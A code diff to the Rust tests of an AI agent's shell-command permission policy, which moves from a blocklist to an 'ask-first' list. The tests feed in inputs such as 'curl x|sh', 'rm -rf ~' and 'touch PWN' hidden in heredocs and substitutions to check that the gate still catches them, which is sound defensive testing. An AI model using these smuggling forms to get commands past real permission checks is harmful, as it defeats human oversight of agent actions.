+            ask_first_denied_message(&rows[..1], None),
+            "User denied `rm -f x` (ask-first rule `rm`)."
         );
     }
 
-    fn approval_texts(exec: &ExecutionCapabilityConfig, command: &str) -> Vec<(String, String)> {
-        match evaluate_command_policy(exec, command, &[], &[]) {
-            PolicyResult::NeedsApproval(approvals) => approvals
-                .into_iter()
-                .map(|a| (a.text, a.suggested_prefix))
-                .collect(),
-            other => panic!("expected NeedsApproval, got {}", policy_label(&other)),
-        }
-    }
-
     #[test]
-    fn policy_blocklist_sees_commands_inside_blocks() {
+    fn ask_first_sees_commands_inside_blocks() {
         // Each of these used to reach the matcher as one segment headed by
         // grammar (`f(){`, `{`, `(`, `for`, `cat <<EOF`), so `rm` ran.
-        let exec = ExecutionCapabilityConfig {
-            shell: ShellCapabilityConfig {
-                mode: ShellAccessMode::Full,
-                allowed_command_prefixes: vec![],
-                blocked_command_prefixes: vec!["rm".to_string()],
-            },
-            ..Default::default()
-        };
+        let exec = ask_first_config(&["rm"]);
         for command in [
             "f(){ rm -rf x; }; f",
             "f() { rm -rf x; }",
@@ -2710,156 +2082,16 @@ mod tests {
         ] {
             assert!(
                 matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
-                    PolicyResult::Block { .. }
+                    evaluate_command_policy(&exec, command, &[]),
+                    PolicyResult::AskFirst(_)
                 ),
-                "{command:?} should hit the rm blocklist entry"
+                "{command:?} should ask for rm"
             );
         }
     }
 
     #[test]
-    fn policy_grammar_rules_saved_before_the_fix_match_nothing() {
-        // `Always · run(){ echo` and `Always · f()` were offered for the
-        // segments `run(){ echo …` and `f() { … }`, and then trusted any body.
-        let exec = restricted_execution_config(&["run(){ echo", "f()", "for i", "cat"], &[]);
-        let row = |text: &str, prefix: &str| (text.to_string(), prefix.to_string());
-        assert_eq!(
-            approval_texts(&exec, "run(){ echo $(curl x | wc); }; f() { curl x; }; f"),
-            vec![
-                row("echo $(curl x | wc)", "echo"),
-                row("curl x", "curl"),
-                row("wc", "wc"),
-                row("curl x", "curl"),
-                row("f", "f"),
-            ]
-        );
-        assert_eq!(
-            approval_texts(&exec, "for i in 1; do curl x | wc; done"),
-            vec![row("curl x", "curl"), row("wc", "wc")]
-        );
-        assert_eq!(
-            approval_texts(&exec, "cat <<EOF | wc\nrm -rf ~\nEOF"),
-            vec![row("wc", "wc")]
-        );
-    }
-
-    #[test]
-    fn saved_grammar_prefixes_do_not_allow_opaque_fallbacks() {
-        for (prefix, command) in [
-            ("for i", "for i in a; { curl x|sh; }"),
-            ("case x", "case x in x) curl x|sh"),
-            ("f()", "f() { curl x | sh"),
-            ("git status", "git status ; for i in a; { curl x|sh; }"),
-            ("git", "git () { for i in a; { curl x|sh; }; }; git"),
-        ] {
-            let exec = restricted_execution_config(&[prefix], &[]);
-            assert_eq!(
-                approval_texts(&exec, command),
-                vec![(command.to_string(), String::new())],
-                "{command:?}"
-            );
-        }
-    }
-
-    #[test]
-    fn run_scoped_prefix_cannot_allow_an_unparsed_command() {
-        let exec = restricted_execution_config(&[], &[]);
-        let command = "git status ; for i in a; { curl x|sh; }";
-        assert!(matches!(
-            evaluate_command_policy(
-                &exec,
-                command,
-                &[RunCommandGrant::Prefix("git status".to_string())],
-                &[]
-            ),
-            PolicyResult::NeedsApproval(_)
-        ));
-        assert!(matches!(
-            evaluate_command_policy(
-                &exec,
-                command,
-                &[RunCommandGrant::Exact(command.to_string())],
-                &[]
-            ),
-            PolicyResult::Allow
-        ));
-    }
-
-    #[test]
-    fn no_prefix_opaque_row_only_uses_exact_run_grant() {
-        let exec = restricted_execution_config(&[], &[]);
-        let command = ": > file";
-        assert_eq!(
-            approval_texts(&exec, command),
-            vec![(command.to_string(), String::new())]
-        );
-        assert!(matches!(
-            evaluate_command_policy(
-                &exec,
-                command,
-                &[RunCommandGrant::Exact(command.to_string())],
-                &[]
-            ),
-            PolicyResult::Allow
-        ));
-        assert!(matches!(
-            evaluate_command_policy(
-                &exec,
-                command,
-                &[RunCommandGrant::Prefix(":".to_string())],
-                &[]
-            ),
-            PolicyResult::NeedsApproval(_)
-        ));
-    }
-
-    #[test]
-    fn valid_bash_splits_into_rows_whose_prefixes_rematch() {
-        // Each input once was one row asked by its whole text. Now each
-        // command is a row, a saved suggestion re-matches its command, and
-        // Full mode never prompts.
-        for command in [
-            "cat > f.rs <<'EOF'\n  x\nEOF\nls -la",
-            "python3 - <<'EOF' 2>&1 | tail -3\nx\nEOF",
-            "cd x && rg a | grep b | head && python3 - <<'PY'\nPY",
-            "echo \"t ${groups.length}\" && ls",
-            "for ((i=0;i<n;i++)); do grep x f; done",
-        ] {
-            let exec = restricted_execution_config(&[], &[]);
-            let PolicyResult::NeedsApproval(rows) =
-                evaluate_command_policy(&exec, command, &[], &[])
-            else {
-                panic!("{command:?} must ask");
-            };
-            assert!(rows.len() > 1, "{command:?}");
-            let prefixes: Vec<&str> = rows
-                .iter()
-                .map(|row| row.suggested_prefix.as_str())
-                .filter(|prefix| !prefix.is_empty())
-                .collect();
-            let exact: Vec<RunCommandGrant> = rows
-                .iter()
-                .filter(|row| row.suggested_prefix.is_empty())
-                .map(|row| RunCommandGrant::Exact(row.text.clone()))
-                .collect();
-            let saved = restricted_execution_config(&prefixes, &[]);
-            assert!(
-                matches!(
-                    evaluate_command_policy(&saved, command, &exact, &[]),
-                    PolicyResult::Allow
-                ),
-                "{command:?}"
-            );
-            assert!(matches!(
-                evaluate_command_policy(&full_execution_config(&[]), command, &[], &[]),
-                PolicyResult::Allow
-            ));
-        }
-    }
-
-    #[test]
-    fn blocklist_reads_every_row_when_one_is_asked_by_exact_text() {
+    fn ask_first_reads_every_row_when_one_is_asked_by_exact_text() {
         // The value arithmetic evaluates, or the arguments a call passes to
         // `"$@"`, are written in another row.
         for command in [
@@ -2868,32 +2100,26 @@ mod tests {
             "f(){ \"$@\"; }; f rm -rf x",
             "ls\nrm -rf x <<'E'\nno end",
         ] {
-            for exec in [
-                full_execution_config(&["rm"]),
-                restricted_execution_config(&[], &["rm"]),
+            for (exec, asks) in [
+                (full_execution_config(&["rm"]), false),
+                (ask_first_config(&["rm"]), true),
             ] {
-                assert!(
-                    matches!(
-                        evaluate_command_policy(&exec, command, &[], &[]),
-                        PolicyResult::Block { .. }
-                    ),
-                    "{command:?}"
-                );
+                assert_eq!(asks_first(&exec, command), asks, "{command:?}");
             }
         }
     }
 
     #[test]
-    fn blocklist_word_scan_reads_paths_and_entries_of_several_words() {
-        for (blocked, command) in [
+    fn ask_first_word_scan_reads_paths_and_entries_of_several_words() {
+        for (rule, command) in [
             ("rm", "x='a[$(/bin/rm -rf y)]'; echo $((x))"),
             ("git push", "x='a[$(git push origin)]'; echo $((x))"),
         ] {
-            for exec in [
-                full_execution_config(&[blocked]),
-                restricted_execution_config(&[], &[blocked]),
+            for (exec, asks) in [
+                (full_execution_config(&[rule]), false),
+                (ask_first_config(&[rule]), true),
             ] {
-                assert!(is_block(&exec, command), "{blocked:?} {command:?}");
+                assert_eq!(asks_first(&exec, command), asks, "{rule:?} {command:?}");
             }
         }
     }
@@ -2909,61 +2135,21 @@ mod tests {
             "cat <(cat <<EOF\nhi\nEOF)\nrm -rf x\n: <<ls\nEOF\n)\nls",
             "echo $(cat <<EOF\nhi\nEOFX)\nrm -rf x\n: <<ls\nEOF\n)\nls",
         ] {
-            for exec in [
-                full_execution_config(&["rm"]),
-                restricted_execution_config(&[], &["rm"]),
+            for (exec, asks) in [
+                (full_execution_config(&["rm"]), false),
+                (ask_first_config(&["rm"]), true),
             ] {
-                assert!(is_block(&exec, command), "{command:?}");
+                assert_eq!(asks_first(&exec, command), asks, "{command:?}");
             }
-            let saved = restricted_execution_config(&["echo", "cat", "ls"], &[]);
-            assert!(
-                matches!(
-                    evaluate_command_policy(&saved, command, &[], &[]),
-                    PolicyResult::NeedsApproval(_)
-                ),
-                "{command:?}"
-            );
         }
     }
 
     #[test]
-    fn saved_runner_prefix_does_not_cover_a_command_held_in_a_variable() {
-        let exec = restricted_execution_config(&["xargs", "exec"], &[]);
-        for command in ["xargs $t", "exec $t x"] {
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
-                    PolicyResult::NeedsApproval(_)
-                ),
-                "{command:?}"
-            );
-        }
-    }
-
-    #[test]
-    fn wrapper_without_a_command_offers_no_prefix() {
-        // A saved `env` would cover `env rm -rf x`.
-        let exec = restricted_execution_config(&[], &[]);
-        for command in ["env", "env --help", "timeout 60"] {
-            let PolicyResult::NeedsApproval(rows) =
-                evaluate_command_policy(&exec, command, &[], &[])
-            else {
-                panic!("{command:?} must ask");
-            };
-            assert!(
-                rows.iter().all(|row| row.suggested_prefix.is_empty()),
-                "{command:?}"
-            );
-        }
-    }
-
-    #[test]
-    fn unparsed_input_is_asked_in_restricted_but_not_in_full_mode() {
-        // bash runs the `touch PWN` in each; the splitter cannot find it,
-        // so it is in a row asked by its exact text: the whole input when no
-        // line of it splits. Restricted asks for that row even without a
-        // blocklist; Full mode never prompts. A blocked `touch` is denied in
-        // both, since the blocklist reads every word of such input.
+    fn ask_first_reads_every_word_of_unparsed_input() {
+        // bash runs the `touch PWN` in each; the splitter cannot find it, so
+        // the rules are read against every word of the input. A `touch`
+        // rule asks in Restricted, unless this run removed it; another rule
+        // does not; Full never asks.
         let commands = [
             "echo $(case a in a) echo;& b) echo;; esac); touch PWN",
             "cat <<EOF|touch PWN\nhi\nEOF",
@@ -2999,136 +2185,47 @@ mod tests {
             "((touch PWN) )",
             "echo $((echo a) ; touch PWN )",
         ];
-        for mode in [ShellAccessMode::Full, ShellAccessMode::Restricted] {
-            for (durable, run) in [("touch", ""), ("", "touch"), ("sudo", "")] {
-                let exec = ExecutionCapabilityConfig {
-                    shell: ShellCapabilityConfig {
-                        mode: mode.clone(),
-                        allowed_command_prefixes: vec!["echo".to_string(), "git".to_string()],
-                        blocked_command_prefixes: [durable]
-                            .into_iter()
-                            .filter(|p| !p.is_empty())
-                            .map(String::from)
-                            .collect(),
-                    },
-                    ..Default::default()
-                };
-                let run_blocked: Vec<String> = [run]
-                    .into_iter()
-                    .filter(|p| !p.is_empty())
-                    .map(String::from)
-                    .collect();
-                for command in commands {
-                    let result = evaluate_command_policy(&exec, command, &[], &run_blocked);
-                    let whole = matches!(
-                        crate::assistant::tools::command_splitter::split_command(command)
-                            .as_slice(),
-                        [crate::assistant::tools::command_splitter::Segment::Unparsed(_)]
-                    );
-                    let touch_blocked = durable == "touch" || run == "touch";
-                    match (mode.clone(), result) {
-                        (_, PolicyResult::Block { .. }) if touch_blocked => {}
-                        (mode, result) if touch_blocked => {
-                            panic!("{mode:?} {command:?} -> {}", policy_label(&result));
-                        }
-                        (ShellAccessMode::Restricted, PolicyResult::NeedsApproval(rows))
-                            if whole =>
-                        {
-                            let [row] = rows.as_slice() else {
-                                panic!("one row expected for {command:?}");
-                            };
-                            assert_eq!(row.text, command.trim());
-                            assert!(
-                                row.kind == SegmentKind::Opaque && row.suggested_prefix.is_empty()
-                            );
-                        }
-                        // A line that splits is a row of its own; the
-                        // `touch PWN` is still in a row the user is asked.
-                        (ShellAccessMode::Restricted, PolicyResult::NeedsApproval(rows)) => {
-                            assert!(
-                                rows.iter().any(|row| row.text.contains("touch PWN")),
-                                "{command:?}"
-                            );
-                        }
-                        (ShellAccessMode::Full, PolicyResult::Allow) => {}
-                        (mode, result) => {
-                            panic!(
-                                "{mode:?} {durable:?} {run:?} {command:?} -> {}",
-                                policy_label(&result)
-                            );
-                        }
-                    }
-                }
+        for (exec, removed, asks) in [
+            (ask_first_config(&["touch"]), &[][..], true),
+            (
+                ask_first_config(&["touch"]),
+                &["touch".to_string()][..],
+                false,
+            ),
+            (ask_first_config(&["sudo"]), &[][..], false),
+            (full_execution_config(&["touch"]), &[][..], false),
+        ] {
+            for command in commands {
+                let result = evaluate_command_policy(&exec, command, removed);
+                assert_eq!(
+                    matches!(result, PolicyResult::AskFirst(_)),
+                    asks,
+                    "{:?} {removed:?} {command:?} -> {result:?}",
+                    exec.shell.mode
+                );
             }
         }
     }
 
     #[test]
-    fn blocklist_sees_a_command_after_an_escaped_blank_and_hash() {
-        let exec = ExecutionCapabilityConfig {
-            shell: ShellCapabilityConfig {
-                mode: ShellAccessMode::Full,
-                allowed_command_prefixes: vec![],
-                blocked_command_prefixes: vec!["touch".to_string()],
-            },
-            ..Default::default()
-        };
-        assert!(matches!(
-            evaluate_command_policy(&exec, "echo a\\ #; touch PWN", &[], &[]),
-            PolicyResult::Block { segment_text, .. } if segment_text == "touch PWN"
-        ));
+    fn ask_first_sees_a_command_after_an_escaped_blank_and_hash() {
+        let exec = ask_first_config(&["touch"]);
+        assert_eq!(
+            asked(&exec, "echo a\\ #; touch PWN"),
+            vec![AskFirstRow {
+                text: "touch PWN".to_string(),
+                rule: "touch".to_string(),
+            }]
+        );
         let continued = "echo a\\ \\\n#; touch PWN";
-        // The continued form is Unparsed: the blocklist reads its words.
-        assert!(is_block(&exec, continued));
-        assert!(is_block(
-            &restricted_execution_config(&[], &["touch"]),
-            continued
-        ));
-        assert_eq!(
-            approval_texts(&restricted_execution_config(&[], &[]), continued),
-            vec![(continued.to_string(), String::new())]
-        );
+        // The continued form is Unparsed: the rules are read against its words.
+        assert!(asks_first(&exec, continued));
+        assert!(!asks_first(&full_execution_config(&["touch"]), continued));
     }
 
     #[test]
-    fn unparsed_input_is_one_exact_row_in_restricted_mode() {
-        let command = "git --version ; for i in a; { touch PWN; }";
-        let mut full = ExecutionCapabilityConfig {
-            shell: ShellCapabilityConfig {
-                mode: ShellAccessMode::Full,
-                allowed_command_prefixes: vec![],
-                blocked_command_prefixes: vec![],
-            },
-            ..Default::default()
-        };
-        assert!(matches!(
-            evaluate_command_policy(&full, command, &[], &[]),
-            PolicyResult::Allow
-        ));
-        // Full mode never prompts for Unparsed input, not even while
-        // blocklist entries are active (run-scoped or durable).
-        assert!(matches!(
-            evaluate_command_policy(&full, command, &[], &["sudo".to_string()]),
-            PolicyResult::Allow
-        ));
-        full.shell.blocked_command_prefixes = vec!["sudo".to_string()];
-        assert!(matches!(
-            evaluate_command_policy(&full, command, &[], &[]),
-            PolicyResult::Allow
-        ));
-        let exec = restricted_execution_config(&["git"], &[]);
-        assert_eq!(
-            approval_texts(&exec, command),
-            vec![(command.to_string(), String::new())]
-        );
-    }
-
-    #[test]
-    fn full_mode_with_default_blocklist_never_prompts() {
-        // Owner rule: Full mode never raises a command-approval prompt.
-        // The rows here span the kinds (a redirect pipeline, a named
-        // code-argument command, an unclosed quote) and none of them
-        // prompts; commands the blocklist does match are denied outright.
+    fn full_mode_with_the_default_list_never_asks() {
+        // Owner rule: Full mode never raises a card and refuses nothing.
         let exec = ExecutionCapabilityConfig {
             shell: ShellCapabilityConfig {
                 mode: ShellAccessMode::Full,
@@ -3136,40 +2233,29 @@ mod tests {
             },
             ..Default::default()
         };
-        assert!(!exec.shell.blocked_command_prefixes.is_empty());
+        assert!(!exec.shell.ask_first_command_prefixes.is_empty());
         for command in [
             "cd /x && SCRATCH=a bash tools/check-links.sh 2>&1 | tail -30",
             "bash -c 'echo hi'",
             "echo \"unclosed",
+            "rm -rf x",
+            "timeout 5 rm x",
+            "git push --force",
         ] {
             assert!(
                 matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
+                    evaluate_command_policy(&exec, command, &[]),
                     PolicyResult::Allow
                 ),
-                "{command} must run without a prompt in Full mode"
+                "{command} must run without a card in Full mode"
             );
         }
-        for command in ["rm -rf x", "timeout 5 rm x"] {
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
-                    PolicyResult::Block { .. }
-                ),
-                "{command} must be denied outright in Full mode"
-            );
-        }
-        // A run-scoped DenyAlways denies the same way, without a prompt.
-        assert!(matches!(
-            evaluate_command_policy(&exec, "rm -rf x", &[], &["rm".to_string()]),
-            PolicyResult::Block { .. }
-        ));
     }
 
     #[test]
     fn full_mode_heredoc_commands_run_without_a_prompt() {
         // Hotfix regression cases: heredoc-fed scripts must run in Full
-        // mode without an approval prompt while the default blocklist is
+        // mode without an approval prompt while the default ask-first list is
         // active. The quoted-delimiter form is Opaque, the unquoted one
         // also yields the command inside its `$(...)`, and the
         // write-then-run form is Unparsed — none of them may prompt.
@@ -3188,7 +2274,7 @@ mod tests {
         for command in commands {
             assert!(
                 matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
+                    evaluate_command_policy(&exec, command, &[]),
                     PolicyResult::Allow
                 ),
                 "{command} must run without a prompt in Full mode"
@@ -3218,7 +2304,7 @@ mod tests {
         );
         // An unquoted delimiter expands its body, so the splitter reports
         // the command inside the `$(...)` as a segment of its own — the
-        // blocklist still applies to it.
+        // ask-first list still applies to it.
         assert_eq!(
             kinds("python3 - <<EOF\nprint(\"x $(touch PWN)\")\nEOF"),
             ["Opaque", "Simple"]
@@ -3227,417 +2313,6 @@ mod tests {
             kinds("cat > f.py <<'EOF'\nprint(1)\nEOF && python3 f.py"),
             ["Unparsed"]
         );
-    }
-
-    #[test]
-    fn restricted_mode_names_commands_whose_argument_is_code() {
-        // Commands whose argument is code are named by their written words, so
-        // every approval row carries a prefix the user can save. The
-        // heredoc forms keep one row for the script and name the command
-        // an unquoted body substitutes.
-        let exec = restricted_execution_config(&[], &[]);
-        assert_eq!(
-            approval_texts(
-                &exec,
-                "cd /x && SCRATCH=a bash tools/check-links.sh 2>&1 | tail -30"
-            ),
-            vec![
-                ("cd /x".to_string(), "cd".to_string()),
-                (
-                    "SCRATCH=a bash tools/check-links.sh 2>&1".to_string(),
-                    "bash tools/check-links.sh".to_string()
-                ),
-                ("tail -30".to_string(), "tail".to_string()),
-            ]
-        );
-        assert_eq!(
-            approval_texts(&exec, "bash -c 'echo hi'"),
-            vec![("bash -c 'echo hi'".to_string(), "bash".to_string())]
-        );
-        assert_eq!(
-            approval_texts(&exec, "find . | xargs grep foo"),
-            vec![
-                ("find .".to_string(), "find".to_string()),
-                ("xargs grep foo".to_string(), "xargs grep".to_string()),
-            ]
-        );
-        assert_eq!(
-            approval_texts(&exec, "python3 -m pytest -q"),
-            vec![(
-                "python3 -m pytest -q".to_string(),
-                "python3 -m pytest".to_string()
-            )]
-        );
-        assert_eq!(
-            approval_texts(&exec, "python3 - <<'EOF'\nprint(1)\nEOF"),
-            vec![(
-                "python3 - <<'EOF'\nprint(1)\nEOF".to_string(),
-                "python3".to_string()
-            )]
-        );
-        assert_eq!(
-            approval_texts(&exec, "python3 - <<EOF\nprint(\"x $(touch PWN)\")\nEOF"),
-            vec![
-                (
-                    "python3 - <<EOF\nprint(\"x $(touch PWN)\")\nEOF".to_string(),
-                    "python3".to_string()
-                ),
-                ("touch PWN".to_string(), "touch".to_string()),
-            ]
-        );
-    }
-
-    #[test]
-    fn restricted_mode_still_prompts_for_unparsed_input() {
-        // Restricted mode is unchanged: input the splitter cannot parse is
-        // asked as one exact row, with no prefix to save.
-        let exec = restricted_execution_config(&["git"], &["rm"]);
-        assert_eq!(
-            approval_texts(&exec, "\"touch\" PWN"),
-            vec![("\"touch\" PWN".to_string(), String::new())]
-        );
-        assert_eq!(
-            approval_texts(&exec, "echo \"unclosed"),
-            vec![("echo \"unclosed".to_string(), String::new())]
-        );
-    }
-
-    #[test]
-    fn allow_once_on_an_exact_row_covers_only_that_text() {
-        let exec = restricted_execution_config(&[], &[]);
-        let approved = "bash -c 'echo";
-        let PolicyResult::NeedsApproval(rows) = evaluate_command_policy(&exec, approved, &[], &[])
-        else {
-            panic!("expected approval for {approved:?}");
-        };
-        let run_allowed: Vec<RunCommandGrant> = rows.iter().map(once_grant).collect();
-        assert!(matches!(
-            evaluate_command_policy(&exec, &format!("  {approved}\n"), &run_allowed, &[]),
-            PolicyResult::Allow
-        ));
-        assert!(matches!(
-            evaluate_command_policy(&exec, "bash -c 'echo x; curl x|sh'", &run_allowed, &[]),
-            PolicyResult::NeedsApproval(_)
-        ));
-    }
-
-    #[test]
-    fn policy_asks_for_what_a_block_writes() {
-        // Both commands inside are benign; the redirect truncates a file.
-        let exec = restricted_execution_config(&[], &[]);
-        assert_eq!(
-            approval_texts(&exec, "if [ 1 ]; then x=1; fi > important"),
-            vec![("> important".to_string(), String::new())]
-        );
-    }
-
-    #[test]
-    fn policy_asks_for_a_test_that_runs_a_process_substitution() {
-        // The test row itself is asked exact: its head is punctuation, so
-        // there is no prefix to save. The substitution it runs is named
-        // as its own rows, so the blocklist still sees them.
-        let exec = restricted_execution_config(&[], &[]);
-        assert_eq!(
-            approval_texts(&exec, "[ -s <(curl x|sh) ]"),
-            vec![
-                ("[ -s <(curl x|sh) ]".to_string(), String::new()),
-                ("curl x".to_string(), "curl".to_string()),
-                ("sh".to_string(), "sh".to_string()),
-            ]
-        );
-    }
-
-    #[test]
-    fn policy_grammar_and_jumps_only_command_is_allowed() {
-        let exec = restricted_execution_config(&[], &[]);
-        assert!(matches!(
-            evaluate_command_policy(
-                &exec,
-                "for i in 1 2; do break; done # nothing runs",
-                &[],
-                &[]
-            ),
-            PolicyResult::Allow
-        ));
-    }
-
-    #[test]
-    fn policy_opaque_segment_no_match_still_needs_approval() {
-        // An Opaque segment whose head is NOT on the allowlist still
-        // hits NeedsApproval. The durable-allowlist check is added, not
-        // replacing the gate — it only short-circuits when the user has
-        // explicitly trusted the prefix.
-        let exec = restricted_execution_config(&["ls"], &[]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, "find /tmp -name foo 2>/dev/null", &[], &[]),
-            PolicyResult::NeedsApproval(_),
-        ));
-    }
-
-    fn policy_label(result: &PolicyResult) -> &'static str {
-        match result {
-            PolicyResult::Allow => "Allow",
-            PolicyResult::Block { .. } => "Block",
-            PolicyResult::NeedsApproval(_) => "NeedsApproval",
-        }
-    }
-
-    // -------------------------------------------------------------------
-    // Benign shell constructs — test expressions and pure assignments
-    // never need approval (no execution surface of their own).
-    // -------------------------------------------------------------------
-
-    #[test]
-    fn policy_single_bracket_test_auto_allows() {
-        // From the drift-detection screenshot: `[ "$CURRENT" != "61dda97" ]`
-        // is a string comparison with no side effects. Should not prompt
-        // even with an empty allowlist.
-        let exec = restricted_execution_config(&[], &[]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, r#"[ "$CURRENT" != "61dda97" ]"#, &[], &[]),
-            PolicyResult::Allow,
-        ));
-    }
-
-    #[test]
-    fn policy_double_bracket_test_auto_allows() {
-        let exec = restricted_execution_config(&[], &[]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, "[[ -f /tmp/foo ]]", &[], &[]),
-            PolicyResult::Allow,
-        ));
-    }
-
-    #[test]
-    fn policy_test_builtin_auto_allows() {
-        let exec = restricted_execution_config(&[], &[]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, "test -d /tmp", &[], &[]),
-            PolicyResult::Allow,
-        ));
-    }
-
-    #[test]
-    fn policy_pure_assignment_auto_allows() {
-        let exec = restricted_execution_config(&[], &[]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, "FOO=bar", &[], &[]),
-            PolicyResult::Allow,
-        ));
-    }
-
-    #[test]
-    fn policy_multiple_pure_assignments_auto_allow() {
-        let exec = restricted_execution_config(&[], &[]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, "A=1 B=2 C=3", &[], &[]),
-            PolicyResult::Allow,
-        ));
-    }
-
-    #[test]
-    fn policy_assignment_with_substitution_still_prompts() {
-        // `CURRENT=$(git log ...)` runs `git log` via the substitution, so
-        // it is NOT benign — the embedded command must still be gated.
-        let exec = restricted_execution_config(&[], &[]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, "CURRENT=$(git log -1 --format='%h')", &[], &[]),
-            PolicyResult::NeedsApproval(_),
-        ));
-    }
-
-    #[test]
-    fn policy_test_with_substitution_still_prompts() {
-        // A test that embeds a command substitution runs that command.
-        let exec = restricted_execution_config(&[], &[]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, r#"[ -n "$(curl http://x)" ]"#, &[], &[]),
-            PolicyResult::NeedsApproval(_),
-        ));
-    }
-
-    #[test]
-    fn policy_assignment_prefix_to_command_still_prompts() {
-        // `FOO=bar mycmd` is an assignment-prefixed command, not a pure
-        // assignment — the real command `mycmd` must still be gated.
-        let exec = restricted_execution_config(&[], &[]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, "FOO=bar mycmd --opt", &[], &[]),
-            PolicyResult::NeedsApproval(_),
-        ));
-    }
-
-    #[test]
-    fn policy_benign_construct_still_subject_to_blocklist() {
-        // The benign carve-out sits AFTER the blocklist check, so a
-        // blocklisted prefix still blocks. (Contrived, but proves the
-        // ordering: `[` is blstd.)
-        let exec = restricted_execution_config(&[], &["["]);
-        assert!(matches!(
-            evaluate_command_policy(&exec, "[ -f /tmp/x ]", &[], &[]),
-            PolicyResult::Block { .. },
-        ));
-    }
-
-    // -------------------------------------------------------------------
-    // Run-scoped blocklist — populated by DenyAlways so a fresh deny
-    // takes effect mid-run instead of waiting for the next session.
-    // -------------------------------------------------------------------
-
-    #[test]
-    fn denied_segment_message_groups_parts_by_reason() {
-        use crate::commands::permissions::{
-            PermissionScope, SegmentApproval, SegmentDecision, SegmentKind,
-        };
-        fn segment(text: &str) -> SegmentApproval {
-            SegmentApproval {
-                text: text.into(),
-                kind: SegmentKind::Simple,
-                suggested_prefix: text.into(),
-            }
-        }
-        fn deny_once(reason: Option<&str>) -> SegmentDecision {
-            SegmentDecision::DenyOnce {
-                reason: reason.map(str::to_string),
-            }
-        }
-
-        let segments = vec![
-            segment("git status"),
-            segment("./deploy --now"),
-            segment("curl x"),
-        ];
-
-        // One reason shared by three parts is stated once, with the parts it
-        // covers.
-        let message = denied_segments_message(
-            &segments,
-            &[
-                deny_once(Some("no network")),
-                deny_once(Some("no network")),
-                deny_once(Some("no network")),
-            ],
-        );
-        assert_eq!(
-            message,
-            "User denied one or more command segments. \
-             Denied parts: `git status`, `./deploy --now`, `curl x`. \
-             Reason: no network."
-        );
-        assert_eq!(message.matches("no network").count(), 1);
-        assert_eq!(message.matches("Denied parts:").count(), 1);
-
-        // Two reasons: each is stated once, with its own parts.
-        let message = denied_segments_message(
-            &segments,
-            &[
-                deny_once(Some("no network")),
-                deny_once(Some("file locked")),
-                deny_once(Some("file locked")),
-            ],
-        );
-        assert_eq!(
-            message,
-            "User denied one or more command segments. \
-             Denied parts: `git status`, `./deploy --now`, `curl x`. \
-             Reason: no network for `git status`. \
-             Reason: file locked for `./deploy --now`, `curl x`."
-        );
-        assert_eq!(message.matches("no network").count(), 1);
-        assert_eq!(message.matches("file locked").count(), 1);
-        assert_eq!(message.matches("Denied parts:").count(), 1);
-
-        // No reason: the denied parts are still listed, with no reason clause.
-        let message = denied_segments_message(
-            &segments,
-            &[deny_once(None), deny_once(None), deny_once(None)],
-        );
-        assert_eq!(
-            message,
-            "User denied one or more command segments. \
-             Denied parts: `git status`, `./deploy --now`, `curl x`."
-        );
-        assert!(!message.contains("Reason:"));
-
-        // A reason on one part and none on another: one list of denied parts,
-        // and the reason names the part it belongs to.
-        let message = denied_segments_message(
-            &segments[..2],
-            &[deny_once(Some("no network")), deny_once(None)],
-        );
-        assert_eq!(
-            message,
-            "User denied one or more command segments. \
-             Denied parts: `git status`, `./deploy --now`. \
-             Reason: no network for `git status`."
-        );
-        assert_eq!(message.matches("Denied parts:").count(), 1);
-        assert_eq!(message.matches("no network").count(), 1);
-
-        // An always-denial carries its reason the same way.
-        let always = SegmentDecision::DenyAlways {
-            scope: PermissionScope::Agent,
-            prefix: "curl".into(),
-            reason: Some("no network".into()),
-        };
-        let message = denied_segments_message(&segments[..1], &[always]);
-        assert_eq!(
-            message,
-            "User denied one or more command segments. \
-             Denied parts: `git status`. Reason: no network."
-        );
-
-        // An allowed part was not denied, so it stays out of the error.
-        let message = denied_segments_message(
-            &segments,
-            &[
-                SegmentDecision::AllowOnce,
-                deny_once(Some("no network")),
-                SegmentDecision::AllowOnce,
-            ],
-        );
-        assert_eq!(
-            message,
-            "User denied one or more command segments. \
-             Denied parts: `./deploy --now`. Reason: no network."
-        );
-    }
-
-    #[test]
-    fn policy_run_scoped_blocklist_blocks_simple_segment() {
-        // No durable blocklist, but a run-scoped DenyAlways for `rm -rf`.
-        // A fresh `rm -rf /tmp/foo` should hit Block without prompting.
-        let exec = restricted_execution_config(&["rm"], &[]);
-        let run_blocked = vec!["rm -rf".to_string()];
-        assert!(matches!(
-            evaluate_command_policy(&exec, "rm -rf /tmp/foo", &[], &run_blocked),
-            PolicyResult::Block { .. },
-        ));
-    }
-
-    #[test]
-    fn policy_run_scoped_blocklist_takes_priority_over_run_scoped_allowlist() {
-        // Blocklist wins over allowlist — matches the durable-list
-        // precedence rule.
-        let exec = restricted_execution_config(&[], &[]);
-        let run_allowed = vec![RunCommandGrant::Prefix("rm".to_string())];
-        let run_blocked = vec!["rm -rf".to_string()];
-        assert!(matches!(
-            evaluate_command_policy(&exec, "rm -rf /tmp/foo", &run_allowed, &run_blocked),
-            PolicyResult::Block { .. },
-        ));
-    }
-
-    #[test]
-    fn policy_run_scoped_blocklist_does_not_cover_unrelated_command() {
-        // `rm file.txt` doesn't match the `rm -rf` prefix, so the
-        // durable allowlist for `rm` still lets it through.
-        let exec = restricted_execution_config(&["rm"], &[]);
-        let run_blocked = vec!["rm -rf".to_string()];
-        assert!(matches!(
-            evaluate_command_policy(&exec, "rm file.txt", &[], &run_blocked),
-            PolicyResult::Allow,
-        ));
     }
 
     #[test]
@@ -3678,18 +2353,11 @@ mod tests {
     // Commands that run their arguments, heredoc bodies, lookups
     // ------------------------------------------------------------------
 
-    fn is_block(exec: &ExecutionCapabilityConfig, command: &str) -> bool {
-        matches!(
-            evaluate_command_policy(exec, command, &[], &[]),
